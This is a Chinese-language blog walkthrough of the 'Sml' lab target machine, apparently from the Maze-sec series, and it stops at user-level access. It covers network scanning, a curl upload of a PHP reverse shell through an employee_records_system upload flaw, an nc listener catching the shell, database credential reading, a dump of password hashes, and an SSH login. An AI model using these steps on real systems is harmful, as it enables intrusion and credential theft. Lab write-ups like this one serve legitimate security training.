@@ -1,0 +1,786 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机说明QQ群：660930334 一、主机探测123456789101112131415┌──(root㉿kali)-[&#x2F;miao&#x2F;maze-sec&#x2F;sml]└─# nmap -sn 192.168.2.0&#x2F;24               Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-10 15:36 CSTNmap scan re">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sml">
+<meta property="og:url" content="http://miao-sec.github.io/Maze-sec/Sml/index.html">
+<meta property="og:site_name" content="Miao&#39;s Blog">
+<meta property="og:description" content="靶机说明QQ群：660930334 一、主机探测123456789101112131415┌──(root㉿kali)-[&#x2F;miao&#x2F;maze-sec&#x2F;sml]└─# nmap -sn 192.168.2.0&#x2F;24               Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-10 15:36 CSTNmap scan re">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/19.jpg">
+<meta property="article:published_time" content="2025-07-13T11:40:00.000Z">
+<meta property="article:modified_time" content="2025-07-13T11:42:47.949Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="employee_records_system">
+<meta property="article:tag" content="提权-库文件">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/19.jpg">
+  
+  
+  
+  <title>Sml - Miao&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/links/"
+            target="_self"
+          >
+            <i class="iconfont icon-link-fill"></i>
+            <span>友链</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Sml"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-13 19:40" pubdate>
+          2025年7月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Sml</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p>
+<h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# nmap -sn 192.168.2.0/24               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-10 15:36 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00044s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00027s latency).<br>MAC Address: 08:00:27:DB:21:14 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.52<br>Host is up (0.00096s latency).<br>MAC Address: 08:00:27:96:5F:B8 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.04 seconds<br></code></pre></td></tr></table></figure>
+<p>靶机IP：<code>192.168.2.52</code></p>
+<h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# nmap --min-rate 10000 -p- 192.168.2.52                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-10 17:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.52<br>Host is up (0.00058s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:96:5F:B8 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 39.98 seconds<br></code></pre></td></tr></table></figure>
+<p>开放端口：<code>22,80</code></p>
+<h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.52               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-10 17:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.52<br>Host is up (0.00049s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Hello everyone!<br>MAC Address: 08:00:27:96:5F:B8 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.51 seconds<br></code></pre></td></tr></table></figure>
+
+<h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# nmap -sU --top-ports 100 192.168.2.52<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-10 17:11 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.52<br>Host is up (0.00090s latency).<br>All 100 scanned ports on 192.168.2.52 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 57 closed udp ports (port-unreach), 43 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:96:5F:B8 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 53.81 seconds<br></code></pre></td></tr></table></figure>
+<p>没有开放的端口</p>
+<h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问80端口，是一个页面登录框<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507131800092.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<h2 id="1、employee-records-system-CVE"><a href="#1、employee-records-system-CVE" class="headerlink" title="1、employee_records_system-CVE"></a>1、employee_records_system-CVE</h2><p>查看页面源码，找到了是<code>employee_records_system</code>系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# curl http://192.168.2.52<br>&lt;!doctype html&gt;<br>&lt;html class=<span class="hljs-string">&quot;no-js&quot;</span> lang=<span class="hljs-string">&quot;&quot;</span>&gt;<br>    &lt;<span class="hljs-built_in">head</span>&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>        &lt;meta http-equiv=<span class="hljs-string">&quot;x-ua-compatible&quot;</span> content=<span class="hljs-string">&quot;ie=edge&quot;</span>&gt;<br>        &lt;title&gt;Hello everyone!&lt;/title&gt;<br>        &lt;meta name=<span class="hljs-string">&quot;description&quot;</span> content=<span class="hljs-string">&quot;&quot;</span>&gt;<br>        &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> href=<span class="hljs-string">&quot;css/jquery-ui.css&quot;</span> /&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> href=<span class="hljs-string">&quot;css/style.css&quot;</span> /&gt;<br>        &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;css/font-awesome.min.css&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;https://fonts.googleapis.com/css?family=Lato&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;https://fonts.googleapis.com/css?family=Roboto+Condensed&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>        &lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;<br>        &lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;js/jquery-ui.min.js&quot;</span>&gt;&lt;/script&gt;<br>    &lt;/head&gt;<br> &lt;body <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;loginPage&quot;</span>&gt;<br>        &lt;div class=<span class="hljs-string">&quot;login_wrapper clearfix&quot;</span>&gt;<br>                &lt;div class=<span class="hljs-string">&quot;LogResponse&quot;</span>&gt;&lt;/div&gt;<br>                &lt;div class=<span class="hljs-string">&quot;login_wrapper_inner&quot;</span>&gt;<br>&lt;!-- https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip --&gt;<br>                        &lt;form <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;loginForm&quot;</span> class=<span class="hljs-string">&quot;clearfix&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> action=<span class="hljs-string">&quot;&quot;</span>&gt;<br>                                &lt;div class=<span class="hljs-string">&quot;input-box&quot;</span>&gt;<br>                                        &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text&quot;</span> class=<span class="hljs-string">&quot;inputField username&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span> placeholder=<span class="hljs-string">&quot;username&quot;</span>&gt;<br>                                        &lt;div class=<span class="hljs-string">&quot;error usernameerror&quot;</span>&gt;&lt;/div&gt;<br>                                &lt;/div&gt;<br>                                &lt;div class=<span class="hljs-string">&quot;input-box&quot;</span>&gt;<br>                                        &lt;input  <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;password&quot;</span> class=<span class="hljs-string">&quot;inputField password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span> placeholder=<span class="hljs-string">&quot;password&quot;</span>&gt;<br>                                        &lt;div class=<span class="hljs-string">&quot;error passworderror&quot;</span>&gt;&lt;/div&gt;<br>                                &lt;/div&gt;<br><br>                                &lt;div class=<span class="hljs-string">&quot;input-box&quot;</span>&gt;<br>                                        &lt;button  <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> class=<span class="hljs-string">&quot;submitField sign_in&quot;</span>&gt;&lt;span class=<span class="hljs-string">&quot;sign-icon&quot;</span>&gt;&lt;i class=<span class="hljs-string">&quot;fa fa-lock&quot;</span>&gt;&lt;/i&gt;&lt;/span&gt; Sign <span class="hljs-keyword">in</span>&lt;/button&gt;<br>                                &lt;/div&gt;<br>                        &lt;/form&gt;<br>                &lt;/div&gt;<br>        &lt;/div&gt;<br> &lt;div class=<span class="hljs-string">&quot;body_overlay&quot;</span>&gt;&lt;/div&gt;<br> <br>  &lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;./js/global.js&quot;</span>&gt;&lt;/script&gt;<br> &lt;/body&gt;<br> &lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>查找<code>employee_records_system</code>的CVE漏洞，找到存在文件上传的漏洞<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507131802727.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<p>上传反弹shell的文件，得到上传后的文件名<code>UnIhBA3TZQwDVPf_rev.php</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# curl http://192.168.2.52/dashboard/uploadID.php -X POST -F <span class="hljs-string">&#x27;employee_ID=@rev.php;filename=rev.php&#x27;</span> <br>&#123;<span class="hljs-string">&quot;upload_filename&quot;</span>:<span class="hljs-string">&quot;UnIhBA3TZQwDVPf_rev.php&quot;</span>,<span class="hljs-string">&quot;selected_filename&quot;</span>:<span class="hljs-string">&quot;rev.php&quot;</span>&#125;  <br></code></pre></td></tr></table></figure>
+
+<h1 id="四、获取www-data权限"><a href="#四、获取www-data权限" class="headerlink" title="四、获取www-data权限"></a>四、获取www-data权限</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# nc -lvnp 4444                                                                                                           <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.52] 55854<br>/usr/bin/script -qc /bin/bash /dev/null<br>www-data@sML:/var/www/html/uploads/employees_ids$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure>
+
+<p><strong>USER FLAG</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@sML:/home/yulian$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-fde7951c3a57bc71b03631a9673ab67e&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、获取USER权限"><a href="#1、获取USER权限" class="headerlink" title="1、获取USER权限"></a>1、获取USER权限</h2><p>找到数据库的用户名和密码，进行连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@sML:/var/www/html/inc$ <span class="hljs-built_in">cat</span> db_connect.php <br>&lt;?php<br><span class="hljs-variable">$mysql_hostname</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$mysql_user</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$mysql_password</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$mysql_database</span> = <span class="hljs-string">&quot;sharp_db&quot;</span>;<br><br><span class="hljs-variable">$db_connect</span> = mysqli_connect(<span class="hljs-variable">$mysql_hostname</span>, <span class="hljs-variable">$mysql_user</span>,<span class="hljs-variable">$mysql_password</span>, <span class="hljs-variable">$mysql_database</span>) or (<span class="hljs-string">&quot;Could not connect database&quot;</span>);<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@sML:/var/www/html/inc$ mysql -u root -p<br>Enter password: <br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection <span class="hljs-built_in">id</span> is 15<br>Server version: 10.5.23-MariaDB-0+deb11u1 Debian 11<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>MariaDB [(none)]&gt;  <span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span>;<br>+---------+-----------+----------+----------+----------------------------------+-------------+<br>| user_id | firstname | lastname | username | password                         | accounttype |<br>+---------+-----------+----------+----------+----------------------------------+-------------+<br>|       1 | Maxwell   | Morrison | xxx2xy   | 10a55271c201e41913764ff95b33248b | Admin       |<br>|       3 | Maxwell   | Morrison | admins   | 02adcdf2171dc7e5757cdd7c0b91fa03 | Admin       |<br>|       2 | Maxwell   | Morrison | yulian   | fde7951c3a57bc71b03631a9673ab67e | Admin       |<br>+---------+-----------+----------+----------+----------------------------------+-------------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.000 sec)<br></code></pre></td></tr></table></figure>
+
+<p>找到用户<code>yulian</code>的密码<code>fde7951c3a57bc71b03631a9673ab67e</code>，进行连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# ssh yulian@192.168.2.52<br>yulian@192.168.2.52<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux sML 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">yulian@sML:~$ id</span><br><span class="hljs-string">uid=1000(yulian) gid=1000(yulian) groups=1000(yulian)</span><br></code></pre></td></tr></table></figure>
+
